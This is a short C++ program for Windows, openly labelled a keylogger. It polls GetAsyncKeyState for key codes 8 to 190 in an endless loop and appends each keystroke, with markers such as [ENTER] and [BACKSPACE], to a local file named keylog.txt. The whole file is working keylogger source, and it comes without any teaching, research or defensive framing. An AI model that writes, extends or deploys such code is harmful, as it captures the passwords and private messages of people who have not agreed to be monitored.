#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void logKey(int key){
    ofstream logFile("keylog.txt", ios::app);

    if (key == VK_BACK) logFile << "[BACKSPACE]";
    else if (key == VK_RETURN) logFile << "[ENTER]\n";
    else if (key == VK_SPACE) logFile << " ";
    else if (key == VK_TAB) logFile << "[TAB]";
    else if (key == VK_SHIFT) logFile << "[SHIFT]";
    else if (key == VK_ESCAPE) logFile << "[ESC]";
    else if (key >= 32 && key <= 126) logFile << char(key);

    logFile.close();
}


int main(){
    cout << "Keylogger started. Logging to keylog.txt..." << endl;

    while(true) {
        Sleep(10);

        for(int key = 8; key <= 190; key++){
            if(GetAsyncKeyState(key) & 0x0001) {
                logKey(key);
            }
        }
    }

    return 0;
}